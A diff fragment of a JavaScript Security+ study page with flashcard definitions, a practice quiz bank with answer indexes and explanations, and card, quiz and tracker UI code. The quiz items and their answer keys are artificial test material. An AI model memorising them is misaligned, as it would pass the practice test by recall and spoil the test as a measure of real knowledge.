+  { term: 'Honeytoken / Canary', def: 'Fake credential, file, or database record that triggers alerts if accessed. If the admin_password.txt honeytokens access is detected, an attacker is in the environment. High-fidelity alert with virtually zero false positives.', cat: 'ops' },
+  { term: 'Attack Kill Chain (Lockheed Martin)', def: 'Reconnaissance -> Weaponization -> Delivery -> Exploitation -> Installation -> C2 -> Actions on Objectives. Defenders aim to detect and break the chain as early as possible. Each stage offers detection/prevention opportunities.', cat: 'ops' },
+  { term: 'Secure SDLC', def: 'Security integrated into every software development phase: requirements (security reqs) -> design (threat modeling) -> coding (SAST, secure coding standards) -> testing (DAST, pen test) -> deployment (hardening) -> maintenance (patch). Cheaper to fix early.', cat: 'governance' },
+  { term: 'Information Rights Management (IRM)', def: 'Controls what recipients can do with documents: view, copy, print, forward, edit, expiry. Applied per-document. Microsoft Azure Information Protection, Adobe RMS. Extends DLP beyond organizational boundaries to external recipients.', cat: 'ops' },
+  { term: 'OSINT (Open Source Intelligence)', def: 'Gathering intelligence from publicly available sources: LinkedIn, Shodan, Google dorking, WHOIS, job postings, social media. Used by attackers for reconnaissance and by defenders for threat intelligence and attack surface monitoring.', cat: 'threats' },
+  { term: 'Threat Intelligence Sharing', def: 'ISACs share sector-specific intel. Formats: STIX (structured threat info expression), TAXII (transport). TLP (Traffic Light Protocol): WHITE (public), GREEN (community), AMBER (restricted), RED (named recipients only). MISP: open-source sharing platform.', cat: 'ops' },
+  { term: 'Separation of Duties', def: 'No single person controls an entire critical process end-to-end. Prevents fraud and errors. Example: person requesting payment cannot also approve it. Complementary controls: dual control (two people act simultaneously), job rotation.', cat: 'governance' },
+  { term: 'Security Awareness Training', def: 'Ongoing education on phishing, social engineering, password hygiene, incident reporting. Simulated phishing: send fake emails, track click rates, train those who click. Most effective when role-specific and continuous, not annual-only.', cat: 'governance' },
+  { term: 'Data Sovereignty', def: 'Data must be stored and processed under the laws of the country where it resides. EU data is governed by GDPR even if processed by US companies. Affects cloud region selection and cross-border data transfer agreements.', cat: 'governance' },
+  { term: 'SASE (Secure Access Service Edge)', def: 'Gartner architecture converging SD-WAN + security (CASB, SWG, ZTNA, FWaaS) from the cloud edge. Ideal for distributed workforce — users connect to nearest edge node. Replaces hub-and-spoke network and appliance-based security stack.', cat: 'ops' },
+  { term: 'Honeynet', def: 'Network of honeypot systems designed to attract and study attackers. Provides threat intelligence about TTPs in a controlled environment. Must be carefully isolated to prevent attackers from using it as a launch point.', cat: 'ops' },
+  { term: 'OSINT', def: 'Open Source Intelligence — gathering information from public sources: LinkedIn, Shodan, Google dorking (site:, filetype:), WHOIS, job postings. Used by attackers for recon and by defenders for attack surface monitoring.', cat: 'threats' },
+  { term: 'Confidential Computing / TEE', def: 'Trusted Execution Environment protects data in use inside a secure CPU enclave (Intel SGX, ARM TrustZone). Even hypervisor/OS cannot read enclave memory. Emerging standard for cloud confidentiality assurance.', cat: 'crypto' },
+  { term: 'Audit Log Requirements', def: 'Logs must be: tamper-proof (WORM storage), complete, centralized, retained per compliance (PCI-DSS 1 year, HIPAA 6 years). SIEM ingests for correlation. Immutable storage prevents attacker from deleting evidence.', cat: 'ops' },
+  { term: 'Principle of Fail-Safe Defaults', def: 'Default behavior should deny access, not grant it. On authentication failure, block access. On configuration error, block traffic. Access requires explicit permission, not explicit denial. Core secure design principle.', cat: 'governance' },
+  { term: 'Security Information Sharing', def: 'ISACs (Information Sharing and Analysis Centers) share sector-specific threat intelligence. Financial (FS-ISAC), Healthcare (H-ISAC). TLP (Traffic Light Protocol): WHITE=public, GREEN=community, AMBER=restricted, RED=named recipients only.', cat: 'ops' },
+  { term: 'Wireless IDS (WIDS)', def: 'Detects rogue APs, evil twins, deauthentication attacks, and unauthorized client connections. Sensors deployed throughout site. Alerts on unauthorized SSID broadcasts and ad-hoc networks. Complements 802.1X for wireless security.', cat: 'ops' },
+  { term: 'CVSS Environmental Score', def: 'Customizes CVSS base score for organizational context. Factors: modified attack vector, target system criticality, existing countermeasures. Example: CVSS 9.0 vulnerability on an isolated test system may be lower effective priority than a 7.0 on a public server.', cat: 'ops' },
+  { term: 'Cryptographic Agility', def: 'Designing systems to easily swap cryptographic algorithms without major rework. Critical for post-quantum readiness. Hard-coding SHA-1 or 1024-bit RSA creates future technical debt. Abstract crypto behind interfaces.', cat: 'crypto' },
+  { term: 'Network Access Control (NAC)', def: 'Enforces security policy before granting network access. Checks: OS patch level, AV status, certificates, disk encryption. Quarantine VLAN for non-compliant devices. Agent-based or agentless. 802.1X is the port-based NAC mechanism.', cat: 'ops' },
+  { term: 'Account Lifecycle Management', def: 'Onboarding: provision with least privilege. Transfer: update permissions for new role (remove old). Offboarding: immediately disable account, revoke tokens, retrieve assets. Orphaned accounts (no owner) are high-risk attack vectors.', cat: 'governance' },
+  { term: 'Security Metrics & KPIs', def: 'Mean Time to Detect (MTTD): how long until threat is found. Mean Time to Respond (MTTR): how long to contain. Patch compliance %. Phishing click rate. These metrics drive security program improvements and demonstrate value to leadership.', cat: 'governance' },
+];
+
+let filteredCards = [...allCards];
+let currentCard = 0;
+let isFlipped = false;
+let knownCards = new Set();
+
+function loadCards() {
+  const cat = document.getElementById('fc-category') ? document.getElementById('fc-category').value : 'all';
+  filteredCards = cat === 'all' ? [...allCards] : allCards.filter(c => c.cat === cat);
+  currentCard = 0; isFlipped = false; knownCards.clear();
+  showCard();
+}
+
+function showCard() {
+  if (!filteredCards.length) return;
+  const card = filteredCards[currentCard];
+  const fc = document.getElementById('flashcard');
+  if (!fc) return;
+  document.getElementById('fc-term').textContent = card.term;
+  document.getElementById('fc-def').textContent = card.def;
+  document.getElementById('fc-progress').textContent = `Card ${currentCard + 1} of ${filteredCards.length}`;
+  document.getElementById('fc-count').textContent = `${currentCard + 1} / ${filteredCards.length}`;
+  document.getElementById('fc-known-count').textContent = knownCards.size;
+  document.getElementById('fc-total-count').textContent = filteredCards.length;
+  if (isFlipped) { fc.style.transform = 'rotateY(0deg)'; isFlipped = false; }
+}
+
+function flipCard() {
+  const fc = document.getElementById('flashcard');
+  if (!fc) return;
+  isFlipped = !isFlipped;
+  fc.style.transform = isFlipped ? 'rotateY(180deg)' : 'rotateY(0deg)';
+}
+
+function nextCard() { if (currentCard < filteredCards.length - 1) { currentCard++; isFlipped = false; showCard(); } }
+function prevCard() { if (currentCard > 0) { currentCard--; isFlipped = false; showCard(); } }
+function markCard(known) { if (known) knownCards.add(currentCard); else knownCards.delete(currentCard); nextCard(); }
+
+const quizQuestions = [
+  { q: 'Which component of the CIA triad does encryption primarily address?', opts: ['Integrity', 'Availability', 'Confidentiality', 'Non-repudiation'], answer: 2, exp: 'Encryption prevents unauthorized disclosure, directly addressing Confidentiality. Hashing addresses Integrity; redundancy addresses Availability.' },
+  { q: 'A user receives an email from "CEO@company.c0m" requesting urgent wire transfer. What attack is this?', opts: ['Phishing', 'Spear phishing / Business Email Compromise', 'Vishing', 'Smishing'], answer: 1, exp: 'This is spear phishing (BEC) — a targeted, personalized attack spoofing executive identity to manipulate a specific individual into financial fraud.' },
+  { q: 'Which algorithm provides both encryption and integrity in a single operation?', opts: ['AES-CBC', 'AES-GCM', 'SHA-256', 'RSA-OAEP'], answer: 1, exp: 'AES-GCM (Galois/Counter Mode) is authenticated encryption — it provides both confidentiality and integrity (authentication tag) simultaneously.' },
+  { q: 'What is the primary purpose of salting passwords?', opts: ['Increase hash output length', 'Prevent rainbow table attacks', 'Encrypt the hash', 'Speed up authentication'], answer: 1, exp: 'A salt is a unique random value added to each password before hashing, ensuring identical passwords produce different hashes and defeating precomputed rainbow tables.' },
+  { q: 'Which protocol would you use to verify a certificate has not been revoked in real time?', opts: ['CRL', 'OCSP', 'LDAP', 'DNSSEC'], answer: 1, exp: 'OCSP (Online Certificate Status Protocol) provides real-time certificate revocation checking. CRL (Certificate Revocation List) is downloaded periodically and may be stale.' },
+  { q: 'A web application concatenates user input directly into SQL queries. What attack does this enable?', opts: ['XSS', 'CSRF', 'SQL Injection', 'Buffer overflow'], answer: 2, exp: 'SQL Injection occurs when user input is directly embedded in SQL queries. Parameterized queries (prepared statements) are the primary defense.' },
+  { q: 'What does Perfect Forward Secrecy (PFS) protect against?', opts: ['Man-in-the-middle attacks', 'Decryption of past sessions if long-term key is compromised', 'Replay attacks', 'Certificate forgery'], answer: 1, exp: 'PFS uses ephemeral (temporary) key pairs per session. If the long-term private key is later compromised, previously recorded sessions cannot be decrypted.' },
+  { q: 'Which access control model bases permissions on user attributes, resource attributes, and environmental conditions?', opts: ['RBAC', 'DAC', 'MAC', 'ABAC'], answer: 3, exp: 'ABAC (Attribute-Based Access Control) evaluates multiple attributes — user role, clearance, time of day, resource classification — for fine-grained, dynamic access decisions.' },
+  { q: 'An attacker exploits a vulnerability in a software update package from a trusted vendor. What type of attack is this?', opts: ['Zero-day exploit', 'Supply chain attack', 'Watering hole attack', 'APT persistence'], answer: 1, exp: 'A supply chain attack compromises software or hardware before delivery. The SolarWinds attack is the most notorious example — malicious code embedded in a signed update.' },
+  { q: 'Which NIST CSF 2.0 function is NEW compared to CSF 1.0?', opts: ['Identify', 'Protect', 'Govern', 'Recover'], answer: 2, exp: 'GOVERN is the new function in NIST CSF 2.0, addressing cybersecurity risk governance, strategy, roles/responsibilities, and policies at the organizational level.' },
+  { q: 'What distinguishes spear phishing from regular phishing?', opts: ['Spear phishing uses malware; phishing uses links', 'Spear phishing is targeted and personalized; phishing is bulk and generic', 'Spear phishing targets only C-suite executives', 'Phishing uses HTTPS; spear phishing uses HTTP'], answer: 1, exp: 'Spear phishing is targeted — attacker researches the victim for personalization. Generic phishing casts a wide net. Whaling = spear phishing targeting executives.' },
+  { q: 'A SOC analyst needs to automate the response to common phishing alerts, including blocking senders and quarantining emails. What tool automates this?', opts: ['SIEM', 'SOAR', 'IDS', 'DLP'], answer: 1, exp: 'SOAR (Security Orchestration, Automation and Response) uses playbooks to automate repetitive SOC tasks. SIEM detects and correlates; SOAR responds automatically.' },
+  { q: 'Which type of malware executes entirely in RAM and uses legitimate system tools, leaving no files on disk?', opts: ['Rootkit', 'Fileless malware', 'Worm', 'RAT'], answer: 1, exp: 'Fileless malware leverages LOLBins (Living Off the Land Binaries) like PowerShell and WMI. No disk artifacts means traditional signature-based AV cannot detect it.' },
+  { q: 'What is the correct order for preserving digital evidence (order of volatility)?', opts: ['Disk → RAM → network → CPU registers', 'CPU registers → RAM → disk → logs', 'Logs → RAM → disk → CPU registers', 'Network → disk → RAM → cloud'], answer: 1, exp: 'Collect most volatile first: CPU registers > RAM > swap/page file > disk > logs > remote/cloud. RAM contains running processes, encryption keys, and network connections.' },
+  { q: 'An organization migrates HR data to AWS S3. Under the shared responsibility model, who is responsible for encrypting the data?', opts: ['AWS', 'The organization (customer)', 'Shared equally', 'The cloud auditor'], answer: 1, exp: 'AWS secures the infrastructure (the cloud). The customer is responsible for securing data IN the cloud — including encryption, access controls, and configuration.' },
+  { q: 'Which framework maps attacker tactics and techniques observed in real-world intrusions?', opts: ['NIST CSF', 'MITRE ATT&CK', 'ISO 27001', 'OWASP Top 10'], answer: 1, exp: 'MITRE ATT&CK is a knowledge base of adversary TTPs (Tactics, Techniques, Procedures) organized by attack phase. Used for threat hunting and detection engineering.' },
+  { q: 'What does RTO specify in disaster recovery planning?', opts: ['Maximum data loss in time', 'Maximum acceptable system downtime before restoration', 'Recovery cost ceiling', 'Backup retention period'], answer: 1, exp: 'RTO (Recovery Time Objective) = maximum acceptable downtime. RPO = maximum acceptable data loss. Lower RTO requires more investment (e.g., hot site vs. cold site).' },
+  { q: 'A developer stores passwords using bcrypt with work factor 12. What security property does this provide beyond SHA-256?', opts: ['Encryption instead of hashing', 'Key stretching — intentionally slow to resist brute force', 'Asymmetric key generation', 'Non-repudiation'], answer: 1, exp: 'Bcrypt is a key-stretching algorithm — it intentionally slows computation (2^12 iterations at work factor 12), making brute-force attacks orders of magnitude slower than SHA-256.' },
+  { q: 'Which regulation requires breach notification to supervisory authorities within 72 hours?', opts: ['HIPAA', 'PCI-DSS', 'GDPR', 'SOX'], answer: 2, exp: 'GDPR requires reporting personal data breaches to the relevant supervisory authority within 72 hours of becoming aware of them. HIPAA requires 60 days for HHS notification.' },
+  { q: 'What is the primary purpose of a CASB?', opts: ['Block all cloud applications', 'Provide visibility and security policy enforcement between users and cloud services', 'Replace firewall for cloud traffic', 'Manage cloud provider infrastructure'], answer: 1, exp: 'A CASB (Cloud Access Security Broker) sits between users and cloud services, providing shadow IT visibility, data security, compliance enforcement, and threat protection.' },
+  { q: 'A digital signature is created using the sender\'s ________ key and verified using the sender\'s ________ key.', opts: ['Public / private', 'Private / public', 'Symmetric / asymmetric', 'Session / master'], answer: 1, exp: 'Digital signatures: sign with PRIVATE key, verify with PUBLIC key. This provides authentication and non-repudiation — only the holder of the private key could have signed.' },
+  { q: 'Which attack injects malicious scripts into a web page that are executed by other users\' browsers?', opts: ['SQL Injection', 'CSRF', 'XSS (Cross-Site Scripting)', 'SSRF'], answer: 2, exp: 'XSS injects client-side scripts (JavaScript) that execute in victims\' browsers. Stored XSS persists in the database. Prevention: output encoding, Content Security Policy (CSP).' },
+  { q: 'An employee copies customer PII to a personal USB drive. Which control would most directly prevent this?', opts: ['SIEM alert', 'Endpoint DLP with USB blocking', 'Network IPS', 'Password policy'], answer: 1, exp: 'Endpoint DLP (Data Loss Prevention) can block or alert on sensitive data being written to USB drives, email attachments, or cloud storage based on content classification.' },
+  { q: 'Which type of pen test gives the tester full knowledge of the internal network, source code, and architecture?', opts: ['Black box', 'Gray box', 'White box', 'Red team'], answer: 2, exp: 'White box (crystal box): full knowledge — most thorough, simulates insider threat or post-breach. Black box: no knowledge, simulates external attacker. Gray box: partial knowledge.' },
+  { q: 'What does CSPM primarily address in cloud environments?', opts: ['Encrypting data at rest', 'Detecting and remediating cloud misconfigurations', 'Managing cloud user identities', 'Monitoring network traffic'], answer: 1, exp: 'CSPM (Cloud Security Posture Management) continuously scans cloud environments for misconfigurations — exposed storage, overly permissive IAM, disabled encryption — against compliance benchmarks.' },
+  { q: 'Which security control reduces the risk that a single compromised account can cause widespread damage?', opts: ['Full disk encryption', 'Least privilege with RBAC', 'Antivirus software', 'VPN'], answer: 1, exp: 'Least privilege combined with RBAC limits what any single account can access. A compromised low-privilege account has limited blast radius compared to one with admin rights.' },
+  { q: 'What is the key difference between SOC 2 Type I and Type II reports?', opts: ['Type I covers financial controls; Type II covers security', 'Type I assesses controls at a point in time; Type II tests effectiveness over a period', 'Type II is public; Type I is private', 'Type I requires auditor; Type II is self-assessed'], answer: 1, exp: 'SOC 2 Type I: snapshot — do controls exist and are they designed properly? Type II: period of time (6–12 months) — do controls operate effectively? Type II is more rigorous.' },
+  { q: 'An attacker sends HTTP requests from a victim\'s authenticated browser to transfer funds without the victim\'s knowledge. What attack is this?', opts: ['XSS', 'CSRF', 'Clickjacking', 'Session hijacking'], answer: 1, exp: 'CSRF (Cross-Site Request Forgery) exploits the trust a web application has in an authenticated user\'s browser. Prevention: CSRF tokens, SameSite cookie attribute.' },
+  { q: 'Which Wi-Fi attack sends forged deauthentication frames to force clients to reconnect, capturing the WPA2 handshake?', opts: ['Evil twin', 'Deauthentication (deauth) attack', 'KRACK', 'WPS PIN attack'], answer: 1, exp: 'A deauth attack sends spoofed 802.11 management frames forcing disconnection. The attacker captures the 4-way handshake during reconnection for offline dictionary cracking. WPA3 PMF prevents this.' },
+  { q: 'A system prevents any program not on an approved list from executing. What is this security control?', opts: ['Antivirus blacklisting', 'Application whitelisting (allowlisting)', 'Heuristic scanning', 'Sandboxing'], answer: 1, exp: 'Application whitelisting/allowlisting blocks all execution except pre-approved software. It is the most restrictive and effective endpoint control, stopping unknown malware automatically.' },
+  { q: 'What does the OWASP Top 10 A01 (Broken Access Control) vulnerability involve?', opts: ['SQL injection via form inputs', 'Users accessing resources beyond their intended permissions', 'Weak encryption algorithms', 'Missing security headers'], answer: 1, exp: 'Broken Access Control (A01 in OWASP 2021) means users can act outside their intended permissions — accessing other users\' data, admin pages, or performing unauthorized operations (like IDOR).' },
+  { q: 'Which of the following best describes an insider threat indicator?', opts: ['Receiving phishing email', 'Large after-hours data downloads to external storage', 'Failed login attempt', 'New software installation by IT'], answer: 1, exp: 'Behavioral indicators: accessing data outside job function, large exports, unusual hours, resignation followed by bulk download. DLP and UBA (User Behavior Analytics) detect these.' },
+  { q: 'TPM is used by BitLocker to protect encryption keys. What additional protection does TPM provide over software-only key storage?', opts: ['Faster encryption', 'Keys are bound to hardware — extracted only if TPM attestation passes', 'Remote key backup', 'Cloud synchronization'], answer: 1, exp: 'TPM binds encryption keys to specific hardware. Keys cannot be extracted without physical access to the TPM. Combined with PIN, provides strong pre-boot protection.' },
+  { q: 'An organization using AWS wants to ensure no sensitive data is stored in publicly accessible S3 buckets. Which tool automates this check?', opts: ['CASB', 'CSPM', 'EDR', 'WAF'], answer: 1, exp: 'CSPM (Cloud Security Posture Management) continuously monitors for cloud misconfigurations like public S3 buckets, open security groups, and disabled encryption.' },
+  { q: 'Which key agreement protocol is used in TLS 1.3 to provide Perfect Forward Secrecy?', opts: ['RSA key exchange', 'DH static', 'ECDHE (Elliptic Curve Diffie-Hellman Ephemeral)', 'AES-256'], answer: 2, exp: 'TLS 1.3 mandates ECDHE (or DHE) for key exchange, providing PFS by generating a unique ephemeral key pair per session. Static RSA key exchange was removed from TLS 1.3.' },
+  { q: 'What is the purpose of a honeynet in a security environment?', opts: ['Provide redundant network capacity', 'Lure and study attacker behavior in a controlled decoy environment', 'Filter malicious DNS queries', 'Monitor legitimate user behavior'], answer: 1, exp: 'A honeynet is a network of honeypots designed to attract attackers. It provides threat intelligence about attacker TTPs and early warning of intrusion without risking production systems.' },
+  { q: 'Under HIPAA, which type of organization is required to sign a Business Associate Agreement?', opts: ['Any vendor that sells software to a hospital', 'Any vendor that creates, receives, maintains, or transmits PHI on behalf of a covered entity', 'All cloud providers used by healthcare companies', 'All vendors in the healthcare supply chain'], answer: 1, exp: 'A Business Associate Agreement (BAA) is required when a vendor handles PHI on behalf of a covered entity. This extends HIPAA obligations to third-party service providers.' },
+  { q: 'What is the key difference between EDR and traditional antivirus?', opts: ['EDR is cloud-based; AV is on-premises', 'EDR uses behavior-based detection and response; AV primarily uses signatures', 'EDR only monitors servers; AV monitors endpoints', 'AV encrypts data; EDR does not'], answer: 1, exp: 'EDR (Endpoint Detection & Response) monitors endpoint behavior continuously, detecting anomalies that signatures miss (like fileless malware). Traditional AV relies on known malware signatures.' },
+  { q: 'Which risk treatment option involves transferring financial risk to a third party?', opts: ['Risk avoidance', 'Risk mitigation', 'Risk acceptance', 'Risk transfer (cyber insurance)'], answer: 3, exp: 'Risk transfer shifts financial consequences to a third party — most commonly via cyber insurance. The risk itself remains; only the financial impact is shifted.' },
+  { q: 'Which technique makes brute-force cracking slower by running the hash function many thousands of times?', opts: ['Salting', 'Key stretching (bcrypt/Argon2)', 'Encryption', 'Tokenization'], answer: 1, exp: 'Key stretching intentionally adds computation cost. Salting prevents rainbow tables but does not slow cracking. bcrypt with work factor 12 = 4096 iterations — significantly slower than SHA-256.' },
+  { q: 'An attacker registers paypa1.com to catch users mistyping paypal.com. What attack is this?', opts: ['Pharming', 'DNS poisoning', 'Typosquatting', 'Clickjacking'], answer: 2, exp: 'Typosquatting registers deliberately misspelled domains to catch typing errors. Pharming redirects via DNS. DNS poisoning corrupts cache. Clickjacking overlays invisible UI elements.' },
+  { q: 'What does shifting left mean in DevSecOps?', opts: ['Moving security controls to the network perimeter', 'Integrating security earlier in the SDLC (design and coding)', 'Using left-side risk matrix entries', 'Prioritizing left-wing regulatory compliance'], answer: 1, exp: 'Shift left means addressing security issues earlier in the software development lifecycle. Fixing a vulnerability at design costs ~6x less than fixing it in production.' },
+  { q: 'A digital signature created with the sender private key and verified with the sender public key provides which security property?', opts: ['Confidentiality only', 'Integrity and non-repudiation', 'Availability', 'Perfect forward secrecy'], answer: 1, exp: 'Digital signatures provide integrity (data not modified) and non-repudiation (sender cannot deny signing). Encryption with the recipient public key provides confidentiality.' },
+  { q: 'Which attack uses legitimate OS tools like PowerShell and WMI to execute malicious code without writing files to disk?', opts: ['Rootkit attack', 'Fileless malware / LOLBins attack', 'Ransomware', 'Buffer overflow'], answer: 1, exp: 'LOLBins (Living Off the Land Binaries) attacks use trusted OS tools for malicious purposes, leaving no disk artifacts that signature-based AV can detect. EDR with behavior analysis is required.' },
+  { q: 'What is the primary defense against Kerberoasting attacks?', opts: ['Disable Kerberos authentication', 'Use strong passwords (25+ chars) or managed service accounts (gMSA) for service accounts', 'Implement multi-factor authentication', 'Apply DHCP snooping'], answer: 1, exp: 'Kerberoasting cracks service account password hashes offline. Service accounts with long, complex passwords (or gMSA with auto-rotating passwords) are not feasibly crackable.' },
+  { q: 'A DPIA (Data Protection Impact Assessment) is required by which regulation for high-risk processing activities?', opts: ['HIPAA', 'PCI-DSS', 'GDPR', 'SOX'], answer: 2, exp: 'GDPR Article 35 requires a DPIA before high-risk processing activities. It identifies and mitigates privacy risks before systems are deployed. Similar to PIA (Privacy Impact Assessment) in US context.' },
+  { q: 'What is the purpose of a honeytoken?', opts: ['Attract attackers to a fake network', 'Trigger alerts when fake credentials or files are accessed by an attacker', 'Encrypt sensitive files', 'Test IDS signature accuracy'], answer: 1, exp: 'Honeytokens are fake credentials, files, or database records. Any access triggers a high-confidence alert with virtually zero false positives, indicating active attacker presence.' },
+  { q: 'At what SDLC phase is threat modeling most valuable?', opts: ['After deployment (to catch missed issues)', 'During testing (pen testing)', 'During design (before code is written)', 'During requirements gathering only'], answer: 2, exp: 'Threat modeling during design identifies security issues before code is written. It is 6-100x cheaper to fix design flaws at design time than post-deployment. STRIDE is a common methodology.' },
+  { q: 'Which supply chain security control verifies software integrity before installation?', opts: ['Antivirus scanning', 'Code signing verification and SBOM review', 'Rate limiting', 'Network segmentation'], answer: 1, exp: 'Code signing uses digital signatures to verify software comes from a trusted source and has not been tampered with. SBOMs (Software Bill of Materials) document all components for vulnerability tracking.' },
+  { q: 'An organization detects a large volume of DNS queries with unusually long subdomain names to an external domain. What threat does this indicate?', opts: ['DDoS amplification attack', 'DNS tunneling for C2 or data exfiltration', 'DNS poisoning attack', 'Zone transfer attempt'], answer: 1, exp: 'DNS tunneling encodes data in DNS query subdomains (e.g., data.attacker.com). Long, high-frequency queries to unusual domains are IoCs. Detect with DNS monitoring, block with RPZ.' },
+  { q: 'What is the key benefit of Just-in-Time (JIT) privileged access over standing privileges?', opts: ['Faster authentication', 'Eliminates always-on admin rights, reducing the attack window to minutes instead of indefinitely', 'Stronger encryption of credentials', 'Removes the need for MFA'], answer: 1, exp: 'JIT access grants privileges only when needed for a limited time. Standing privileges mean a compromised account has constant admin access. JIT is a core zero-trust privileged access control.' },
+  { q: 'Which framework uses Tactics, Techniques, and Procedures (TTPs) to describe adversary behavior?', opts: ['NIST CSF', 'ISO 27001', 'MITRE ATT&CK', 'OWASP Top 10'], answer: 2, exp: 'MITRE ATT&CK is a knowledge base of adversary TTPs observed in real attacks, organized by tactic (why) and technique (how). Used for threat hunting, detection engineering, and red team planning.' },
+  { q: 'Which of the following is a characteristic of SASE architecture?', opts: ['On-premises appliances replacing cloud services', 'Converging SD-WAN and security services (CASB, ZTNA) delivered from cloud edge', 'A VPN-only solution for remote workers', 'Layer 2 switching with security inspection'], answer: 1, exp: 'SASE (Secure Access Service Edge) converges networking (SD-WAN) and security (CASB, SWG, ZTNA) delivered from cloud points of presence closest to users, eliminating hub-and-spoke backhauling.' },
+  { q: 'An employee is terminated. Which action must happen immediately to prevent unauthorized access?', opts: ['Change the employee password', 'Disable all accounts and revoke access tokens and certificates', 'Archive their files', 'Notify HR'], answer: 1, exp: 'Immediate account disablement, token revocation, and certificate revocation are critical offboarding steps. Delayed offboarding is one of the most common sources of insider threat and unauthorized access.' },
+  { q: 'What does cryptographic agility mean?', opts: ['Using the fastest encryption algorithm', 'Designing systems to easily replace cryptographic algorithms without major rework', 'Supporting multiple users with one key', 'Automatically rotating encryption keys'], answer: 1, exp: 'Cryptographic agility means abstracting crypto behind interfaces so algorithms can be swapped (e.g., RSA to post-quantum CRYSTALS) without redesigning the entire system. Critical for quantum readiness.' },
+  { q: 'A SOC analyst sees a host making DNS queries with 200-character subdomain names every 60 seconds. What is most likely occurring?', opts: ['Normal CDN traffic', 'DNS tunneling for C2 communication or data exfiltration', 'DDoS amplification via DNS', 'DNS cache poisoning'], answer: 1, exp: 'DNS tunneling encodes data in unusually long subdomain strings sent at regular intervals. The pattern (long queries + beaconing interval) strongly indicates C2 communication or exfiltration.' },
+  { q: 'Which password storage approach is currently considered best practice?', opts: ['SHA-256 with a salt', 'MD5 without a salt', 'Argon2 with a unique salt per password', 'AES-256 encryption'], answer: 2, exp: 'Argon2 (winner of Password Hashing Competition) is designed for password storage: memory-hard, configurable iterations, resistant to GPU/ASIC attacks. SHA-256 is too fast for password storage.' },
+  { q: 'What is the FIRST step in the NIST incident response lifecycle?', opts: ['Detection', 'Preparation', 'Containment', 'Recovery'], answer: 1, exp: 'NIST SP 800-61 IR Lifecycle: 1. Preparation (policies, tools, training, playbooks), 2. Detection & Analysis, 3. Containment, 4. Eradication, 5. Recovery, 6. Post-Incident Activity.' },
+  { q: 'A company uses tokenization for credit card data. What does this mean for PCI-DSS compliance scope?', opts: ['Scope is eliminated entirely', 'Scope is significantly reduced — systems holding only tokens may be out of scope', 'Scope increases because tokenization requires additional controls', 'No impact on PCI-DSS scope'], answer: 1, exp: 'Tokenization reduces PCI-DSS scope. Systems that only process tokens (not card data) may be de-scoped. The token vault holding actual card data remains in scope.' },
+  { q: 'Which security control provides the highest confidence that an attacker is actively in the environment?', opts: ['SIEM alert on failed login', 'IDS signature match', 'Honeytoken access detected', 'Antivirus quarantine'], answer: 2, exp: 'Honeytoken access is a near-zero false-positive alert. Honeytokens have no legitimate use — any access definitively indicates attacker activity. Much higher confidence than signature matches.' },
+];
+
+let quizQs = [];
+let currentQ = 0;
+let score = 0;
+let answered = false;
+
+function initQuiz() {
+  quizQs = [...quizQuestions].sort(() => Math.random() - 0.5).slice(0, 60);
+  currentQ = 0; score = 0; answered = false;
+  document.getElementById('quiz-result').style.display = 'none';
+  document.getElementById('quiz-container').style.display = 'block';
+  document.getElementById('q-total').textContent = quizQs.length;
+  renderQuestion();
+}
+
+function renderQuestion() {
+  if (currentQ >= quizQs.length) { showResult(); return; }
+  answered = false;
+  const q = quizQs[currentQ];
+  document.getElementById('q-current').textContent = currentQ + 1;
+  document.getElementById('quiz-progress').style.width = `${(currentQ / quizQs.length) * 100}%`;
+  const area = document.getElementById('question-area');
+  area.innerHTML = `<div class="quiz-question"><p class="q-text">${q.q}</p><div class="q-options">${q.opts.map((o, i) => `<button class="q-opt" onclick="selectAnswer(${i})">${String.fromCharCode(65+i)}. ${o}</button>`).join('')}</div><div class="q-explanation" id="q-exp" style="display:none"></div><button class="q-next-btn" id="q-next" onclick="nextQuestion()" style="display:none">Next Question →</button></div>`;
+}
+
+function selectAnswer(idx) {
+  if (answered) return;
+  answered = true;
+  const q = quizQs[currentQ];
+  if (idx === q.answer) score++;
+  const btns = document.querySelectorAll('.q-opt');
+  btns.forEach((b, i) => {
+    b.disabled = true;
+    if (i === q.answer) b.classList.add('correct');
+    else if (i === idx) b.classList.add('incorrect');
+  });
+  const exp = document.getElementById('q-exp');
+  exp.innerHTML = `<strong>${idx === q.answer ? '✓ Correct!' : '✗ Incorrect.'}</strong> ${q.exp}`;
+  exp.style.display = 'block';
+  document.getElementById('q-next').style.display = 'inline-block';
+}
+
+function nextQuestion() { currentQ++; renderQuestion(); }
+
+function showResult() {
+  document.getElementById('quiz-container').style.display = 'none';
+  document.getElementById('quiz-result').style.display = 'block';
+  document.getElementById('quiz-result').innerHTML = buildScoreCard(score, quizQs.length);
+}
+
+// ── Week Tracker ─────────────────────────────────────────────────────────────
+function toggleTracker() {
+  const body    = document.getElementById('tracker-body');
+  const chevron = document.getElementById('tracker-chevron');
+  const open    = body.classList.toggle('open');
+  chevron.classList.toggle('open', open);
+}
+
+function saveTracker() {
+  const state = [1,2,3,4,5].map(i => document.getElementById('task-'+i)?.checked || false);
+  localStorage.setItem('tracker_secplus', JSON.stringify(state));
+  renderTracker(state);
+}
+
+function renderTracker(state) {
+  let done = 0;
+  state.forEach((checked, i) => {
+    const cb  = document.getElementById('task-'+(i+1));
+    const day = document.getElementById('tday-'+(i+1));
+    if (cb)  cb.checked = checked;
+    if (day) day.classList.toggle('done', checked);
+    if (checked) done++;
+  });
+  const el = document.getElementById('tracker-progress');
+  if (el) el.textContent = done + ' / 5 complete';
+}
+
+function loadTracker() {
+  try {
+    const saved = JSON.parse(localStorage.getItem('tracker_secplus') || '[]');
+    if (saved.length === 5) renderTracker(saved);
+  } catch(e) {}
+}
+
+// ── Score Card builder ────────────────────────────────────────────────────────
+function buildScoreCard(score, total) {
+  const pct    = Math.round(score / total * 100);
+  const passed = pct >= 72;
+  const date   = new Date().toLocaleDateString('en-US', {weekday:'long',month:'long',day:'numeric',year:'numeric'});
+  const grade  = pct >= 90 ? 'Excellent! 🎉' : pct >= 80 ? 'Great Job! 👍' : pct >= 72 ? 'Passed ✓' : pct >= 60 ? 'Almost There 📚' : 'Keep Studying 💪';
+  return `<div class="score-card ${passed?'pass':'fail'}">
+    <div class="score-card-header">
+      <div style="font-size:0.7rem;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--text-muted);margin-bottom:6px;">CompTIA Study Library</div>
+      <div class="score-card-title">CompTIA Security+ Practice Quiz</div>
+      <div class="score-card-date">${date}</div>
+    </div>
+    <div class="score-card-numbers">
+      <div class="score-card-num">
